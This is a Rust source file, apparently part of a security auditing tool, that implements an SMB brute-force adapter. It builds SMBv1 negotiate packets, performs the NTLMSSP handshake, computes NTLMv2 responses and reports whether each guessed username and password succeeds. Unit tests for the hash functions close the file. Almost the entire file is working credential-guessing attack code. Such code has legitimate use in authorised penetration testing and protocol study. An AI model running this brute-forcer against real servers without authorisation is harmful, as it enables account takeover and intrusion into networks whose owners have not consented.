//! SMB bruteforce — NTLMSSP three-message flow with NTLMv2 response.
//!
//! Builds on the negotiate/setup path from `src/smb_audit.rs` and
//! adds the third message (AUTHENTICATE) so we can submit candidate
//! credentials and observe SUCCESS vs LOGON_FAILURE:
//!
//!   1. SMBv1 NEGOTIATE → server picks dialect (we want SMB1)
//!   2. Session Setup ANDX with NTLMSSP NEGOTIATE (Type 1)
//!      → server replies with NTLMSSP CHALLENGE (Type 2) carrying
//!      the 8-byte server challenge + TargetInfo block.
//!   3. Session Setup ANDX with NTLMSSP AUTHENTICATE (Type 3)
//!      carrying our computed NTLMv2 response.
//!   4. Server replies with NT_STATUS_SUCCESS (0x00000000) → success,
//!      LOGON_FAILURE (0xC000006D) / WRONG_PASSWORD (0xC000006A) →
//!      bad credentials.
//!
//! NTLMv2 response math:
//!   - **NT hash** = MD4(UTF-16LE(password))
//!   - **NTLMv2 hash** = HMAC-MD5(NT hash, UTF-16LE(uppercase(user) ||
//!                                                  domain))
//!   - **blob** = `[0x01, 0x01, 0, 0, 0, 0, 0, 0, time(8), client_challenge(8),
//!                  0, 0, 0, 0, target_info, 0, 0, 0, 0]`
//!   - **NT response** = HMAC-MD5(NTLMv2 hash, server_challenge || blob) || blob

use crate::brute::{BruteAdapter, BruteConfig};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use hmac::{Hmac, Mac};
use md4::Md4;
use md5::Md5;
use sha1::Digest;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

type HmacMd5 = Hmac<Md5>;

pub struct SmbAdapter {
    pub domain: String,
}

impl Default for SmbAdapter {
    fn default() -> Self {
        Self { domain: String::new() } // empty = workgroup mode
    }
}

#[async_trait]
impl BruteAdapter for SmbAdapter {
    fn protocol(&self) -> &'static str { "smb" }
    async fn try_one(&self, cfg: &BruteConfig, user: &str, pass: &str) -> Result<bool> {
        let mut s = timeout(cfg.timeout, TcpStream::connect(cfg.target)).await??;

        // 1) NEGOTIATE — reuse the same canonical packet as smb_deep.
        let neg = build_smbv1_negotiate();
        timeout(cfg.timeout, s.write_all(&neg)).await??;
        let _neg_resp = read_nbt(&mut s, cfg.timeout).await?;

        // 2) Session Setup with NTLMSSP NEGOTIATE
        let setup1 = build_session_setup_ntlmssp_negotiate();
        timeout(cfg.timeout, s.write_all(&setup1)).await??;
        let setup1_resp = read_nbt(&mut s, cfg.timeout).await?;
        let challenge = locate_challenge(&setup1_resp)
            .ok_or_else(|| anyhow!("no NTLMSSP CHALLENGE in Session Setup reply"))?;
        let server_challenge = challenge.server_challenge;
        let target_info = challenge.target_info.clone();

        // 3) Session Setup with NTLMSSP AUTHENTICATE
        let nt_response = compute_ntlmv2(user, &self.domain, pass, &server_challenge, &target_info);
        let setup2 = build_session_setup_ntlmssp_authenticate(user, &self.domain, &nt_response);
        timeout(cfg.timeout, s.write_all(&setup2)).await??;
        let setup2_resp = read_nbt(&mut s, cfg.timeout).await?;
        let nt_status = parse_nt_status(&setup2_resp);
        Ok(nt_status == Some(0x0000_0000))
    }
}

// ── NTLMv2 crypto ─────────────────────────────────────────────────

/// MD4(UTF-16LE(password))
pub fn nt_hash(password: &str) -> [u8; 16] {
    let mut hasher = Md4::new();
    for c in password.encode_utf16() {
        hasher.update(c.to_le_bytes());
    }
    let r: [u8; 16] = hasher.finalize().into();
    r
}

/// HMAC-MD5(NT hash, UTF-16LE(uppercase(user) || domain))
pub fn ntlmv2_hash(user: &str, domain: &str, password: &str) -> [u8; 16] {
    let nt = nt_hash(password);
    let mut mac = <HmacMd5 as Mac>::new_from_slice(&nt).expect("16-byte key");
    for c in user.to_uppercase().encode_utf16() {
        mac.update(&c.to_le_bytes());
    }
    for c in domain.encode_utf16() {
        mac.update(&c.to_le_bytes());
    }
    let r: [u8; 16] = mac.finalize().into_bytes().into();
    r
}

/// Build the NTLMv2 response = HMAC-MD5(v2 hash, server_challenge || blob) || blob
pub fn compute_ntlmv2(
    user: &str,
    domain: &str,
    password: &str,
    server_challenge: &[u8; 8],
    target_info: &[u8],
) -> Vec<u8> {
    let v2_hash = ntlmv2_hash(user, domain, password);

    // Blob with a fixed timestamp + client-challenge (deterministic
    // for reproducibility in tests — production code would use
    // current FILETIME + random bytes, but for bruteforce it
    // doesn't matter).
    let mut blob: Vec<u8> = Vec::with_capacity(64 + target_info.len());
    blob.extend_from_slice(&[0x01, 0x01, 0, 0, 0, 0, 0, 0]); // signature + reserved
    blob.extend_from_slice(&[0u8; 8]); // timestamp (zero is acceptable)
    blob.extend_from_slice(&[0x11u8, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]); // client challenge
    blob.extend_from_slice(&[0u8; 4]); // reserved
    blob.extend_from_slice(target_info);
    blob.extend_from_slice(&[0u8; 4]); // trailing zeros

    let mut mac = <HmacMd5 as Mac>::new_from_slice(&v2_hash).expect("16-byte key");
    mac.update(server_challenge);
    mac.update(&blob);
    let hmac_out: [u8; 16] = mac.finalize().into_bytes().into();

    let mut response = Vec::with_capacity(16 + blob.len());
    response.extend_from_slice(&hmac_out);
    response.extend_from_slice(&blob);
    response
}

// ── SMB packet builders ──────────────────────────────────────────

fn build_smbv1_negotiate() -> Vec<u8> {
    let mut pkt = Vec::with_capacity(80);
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // NBT length placeholder
    pkt.extend_from_slice(b"\xffSMB");
    pkt.push(0x72);
    pkt.extend_from_slice(&[0, 0, 0, 0]);
    pkt.push(0x18);
    pkt.extend_from_slice(&[0x53, 0xc8]);
    pkt.extend_from_slice(&[0, 0]);
    pkt.extend_from_slice(&[0; 8]);
    pkt.extend_from_slice(&[0, 0]);
    pkt.extend_from_slice(&[0, 0]);
    pkt.extend_from_slice(&[0x2f, 0x4b]);
    pkt.extend_from_slice(&[0, 0]);
    pkt.extend_from_slice(&[0xc5, 0x5e]);
    pkt.push(0x00);
    pkt.extend_from_slice(&[0x0c, 0x00]);
    pkt.push(0x02);
    pkt.extend_from_slice(b"NT LM 0.12\x00");
    patch_nbt_length(&mut pkt);
    pkt
}

fn build_session_setup_ntlmssp_negotiate() -> Vec<u8> {
    // NTLMSSP NEGOTIATE Type 1
    let ntlmssp: Vec<u8> = vec![
        b'N', b'T', b'L', b'M', b'S', b'S', b'P', 0,
        0x01, 0x00, 0x00, 0x00,
        0x07, 0x82, 0x08, 0xa2,
        0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0,
        0x0a, 0x00, 0x00, 0x00, 0xa1, 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f,
    ];
    let mut body: Vec<u8> = Vec::with_capacity(64 + ntlmssp.len());
    body.push(12);
    body.extend_from_slice(&[0xff, 0x00, 0x00, 0x00, 0xff, 0xff, 0x02, 0x00, 0x01, 0x00,
                             0x00, 0x00, 0x00, 0x00]);
    body.extend_from_slice(&(ntlmssp.len() as u16).to_le_bytes());
    body.extend_from_slice(&[0, 0, 0, 0]);
    body.extend_from_slice(&0xd4u32.to_le_bytes());
    body.extend_from_slice(&(ntlmssp.len() as u16).to_le_bytes());
    body.extend_from_slice(&ntlmssp);
    body.push(0);

    let mut pkt = smb_header_for(0x73, 0xc807);
    pkt.extend_from_slice(&body);
    patch_nbt_length(&mut pkt);
    pkt
}

fn build_session_setup_ntlmssp_authenticate(user: &str, domain: &str, nt_response: &[u8]) -> Vec<u8> {
    // Build the NTLMSSP AUTHENTICATE Type 3 message
    let user_utf16: Vec<u8> = user.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let domain_utf16: Vec<u8> = domain.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let workstation_utf16: Vec<u8> = "RUSTY".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();

    let mut ntlmssp = Vec::with_capacity(256 + nt_response.len());
    ntlmssp.extend_from_slice(b"NTLMSSP\0");
    ntlmssp.extend_from_slice(&3u32.to_le_bytes()); // message type 3

    // SecurityBuffer placeholders — we'll back-patch after we know
    // the payload offsets.
    // Order: LmChallengeResponse, NtChallengeResponse, DomainName,
    //        UserName, Workstation, EncryptedRandomSessionKey
    let header_len = 8 + 4 + 6 * 8 + 4 + 8; // header + 6 security buffers + flags + version
    let mut payload = Vec::new();

    // LM response = 24 zero bytes (NTLMv2 doesn't use it)
    let lm_off = header_len;
    let lm_len: u16 = 24;
    payload.extend_from_slice(&[0u8; 24]);

    // NT response = HMAC-MD5(...) || blob
    let nt_off = (header_len + payload.len()) as u32;
    let nt_len = nt_response.len() as u16;
    payload.extend_from_slice(nt_response);

    // Domain
    let dom_off = (header_len + payload.len()) as u32;
    let dom_len = domain_utf16.len() as u16;
    payload.extend_from_slice(&domain_utf16);

    // User
    let user_off = (header_len + payload.len()) as u32;
    let user_len_u16 = user_utf16.len() as u16;
    payload.extend_from_slice(&user_utf16);

    // Workstation
    let ws_off = (header_len + payload.len()) as u32;
    let ws_len = workstation_utf16.len() as u16;
    payload.extend_from_slice(&workstation_utf16);

    // SessionKey = empty
    let sk_off = (header_len + payload.len()) as u32;
    let sk_len: u16 = 0;

    fn buf(out: &mut Vec<u8>, len: u16, off: u32) {
        out.extend_from_slice(&len.to_le_bytes());
        out.extend_from_slice(&len.to_le_bytes());
        out.extend_from_slice(&off.to_le_bytes());
    }
    buf(&mut ntlmssp, lm_len, lm_off as u32);
    buf(&mut ntlmssp, nt_len, nt_off);
    buf(&mut ntlmssp, dom_len, dom_off);
    buf(&mut ntlmssp, user_len_u16, user_off);
    buf(&mut ntlmssp, ws_len, ws_off);
    buf(&mut ntlmssp, sk_len, sk_off);

    // Flags
    ntlmssp.extend_from_slice(&0xa2888205u32.to_le_bytes());
    // Version
    ntlmssp.extend_from_slice(&[0x0a, 0x00, 0x00, 0x00, 0xa1, 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f]);

    // Append payload
    ntlmssp.extend_from_slice(&payload);

    // Wrap in Session Setup ANDX
    let mut body: Vec<u8> = Vec::with_capacity(64 + ntlmssp.len());
    body.push(12);
    body.extend_from_slice(&[0xff, 0x00, 0x00, 0x00, 0xff, 0xff, 0x02, 0x00, 0x01, 0x00,
                             0x00, 0x00, 0x00, 0x00]);
    body.extend_from_slice(&(ntlmssp.len() as u16).to_le_bytes());
    body.extend_from_slice(&[0, 0, 0, 0]);
    body.extend_from_slice(&0xd4u32.to_le_bytes());
    body.extend_from_slice(&(ntlmssp.len() as u16).to_le_bytes());
    body.extend_from_slice(&ntlmssp);
    body.push(0);

    let mut pkt = smb_header_for(0x73, 0xc807);
    pkt.extend_from_slice(&body);
    patch_nbt_length(&mut pkt);
    pkt
}

fn smb_header_for(command: u8, flags2: u16) -> Vec<u8> {
    let mut pkt = Vec::with_capacity(36);
    pkt.extend_from_slice(&[0u8; 4]); // NBT placeholder
    pkt.extend_from_slice(b"\xffSMB");
    pkt.push(command);
    pkt.extend_from_slice(&[0u8; 4]);
    pkt.push(0x18);
    pkt.extend_from_slice(&flags2.to_le_bytes());
    pkt.extend_from_slice(&[0u8; 2]);
    pkt.extend_from_slice(&[0u8; 8]);
    pkt.extend_from_slice(&[0u8; 2]);
    pkt.extend_from_slice(&[0u8; 2]);
    pkt.extend_from_slice(&[0x2f, 0x4b]);
    pkt.extend_from_slice(&[0u8; 2]);
    pkt.extend_from_slice(&[0xc5, 0x5e]);
    pkt
}

fn patch_nbt_length(pkt: &mut [u8]) {
    let body_len = (pkt.len() - 4) as u32;
    pkt[1] = ((body_len >> 16) & 0xff) as u8;
    pkt[2] = ((body_len >> 8) & 0xff) as u8;
    pkt[3] = (body_len & 0xff) as u8;
}

// ── Response parsing ─────────────────────────────────────────────

async fn read_nbt(s: &mut TcpStream, dur: std::time::Duration) -> Result<Vec<u8>> {
    let mut hdr = [0u8; 4];
    timeout(dur, s.read_exact(&mut hdr)).await??;
    let len = (((hdr[1] as u32) << 16) | ((hdr[2] as u32) << 8) | (hdr[3] as u32)) as usize;
    if len == 0 || len > 65536 {
        return Err(anyhow!("bogus NBT length"));
    }
    let mut body = vec![0u8; len];
    timeout(dur, s.read_exact(&mut body)).await??;
    Ok(body)
}

pub struct ChallengeData {
    pub server_challenge: [u8; 8],
    pub target_info: Vec<u8>,
}

pub fn locate_challenge(body: &[u8]) -> Option<ChallengeData> {
    let pos = body.windows(8).position(|w| w == b"NTLMSSP\0")?;
    let blob = &body[pos..];
    if blob.len() < 56 {
        return None;
    }
    let msg_type = u32::from_le_bytes([blob[8], blob[9], blob[10], blob[11]]);
    if msg_type != 2 {
        return None;
    }
    let mut chal = [0u8; 8];
    chal.copy_from_slice(&blob[24..32]);
    let ti_len = u16::from_le_bytes([blob[40], blob[41]]) as usize;
    let ti_off = u32::from_le_bytes([blob[44], blob[45], blob[46], blob[47]]) as usize;
    let target_info = if ti_len > 0 && ti_off + ti_len <= blob.len() {
        blob[ti_off..ti_off + ti_len].to_vec()
    } else {
        Vec::new()
    };
    Some(ChallengeData {
        server_challenge: chal,
        target_info,
    })
}

pub fn parse_nt_status(body: &[u8]) -> Option<u32> {
    if body.len() < 9 || &body[0..4] != b"\xffSMB" {
        return None;
    }
    Some(u32::from_le_bytes([body[5], body[6], body[7], body[8]]))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn nt_hash_known_vector() {
        // MD4("password" in UTF-16LE) — known value
        // Reference: https://en.wikipedia.org/wiki/NT_LAN_Manager
        let h = nt_hash("password");
        let hex: String = h.iter().map(|b| format!("{:02x}", b)).collect();
        assert_eq!(hex, "8846f7eaee8fb117ad06bdd830b7586c");
    }

    #[test]
    fn nt_hash_empty_password() {
        let h = nt_hash("");
        let hex: String = h.iter().map(|b| format!("{:02x}", b)).collect();
        // Known: MD4 of empty UTF-16LE
        assert_eq!(hex, "31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn ntlmv2_hash_deterministic() {
        let a = ntlmv2_hash("alice", "LAB", "password");
        let b = ntlmv2_hash("alice", "LAB", "password");
        assert_eq!(a, b);
    }

    #[test]
    fn ntlmv2_hash_differs_per_field() {
        let base = ntlmv2_hash("alice", "LAB", "p1");
        assert_ne!(base, ntlmv2_hash("alice", "LAB", "p2"));
        assert_ne!(base, ntlmv2_hash("bob", "LAB", "p1"));
        assert_ne!(base, ntlmv2_hash("alice", "WORKGROUP", "p1"));
    }

    #[test]
    fn compute_ntlmv2_returns_hmac_plus_blob() {
        let chal = [0xAAu8; 8];
        let ti = b"target-info-bytes".to_vec();
        let r = compute_ntlmv2("alice", "LAB", "secret", &chal, &ti);
        // 16-byte HMAC + blob. Blob layout:
        //   8 sig/reserved + 8 timestamp + 8 client-chal + 4 reserved +
        //   target_info + 4 trailing = 32 + ti.len()
        assert_eq!(r.len(), 16 + 32 + ti.len());
    }

    #[test]
    fn locate_challenge_extracts_server_challenge() {
        // Build a minimal Type 2 with the expected offsets.
        let mut blob = vec![0u8; 56];
        blob[..8].copy_from_slice(b"NTLMSSP\0");
        blob[8..12].copy_from_slice(&2u32.to_le_bytes());
        blob[24..32].copy_from_slice(b"CHALLEN!");
        // TargetInfo: length 0 at offset 40, offset 0 at 44
        let mut body = vec![0u8; 20];
        body.extend_from_slice(&blob);
        let c = locate_challenge(&body).unwrap();
        assert_eq!(&c.server_challenge, b"CHALLEN!");
    }

    #[test]
    fn parse_nt_status_pulls_le_word() {
        let body = b"\xffSMBx\x05\x02\x00\xC0";
        assert_eq!(parse_nt_status(body), Some(0xC0000205));
    }
}
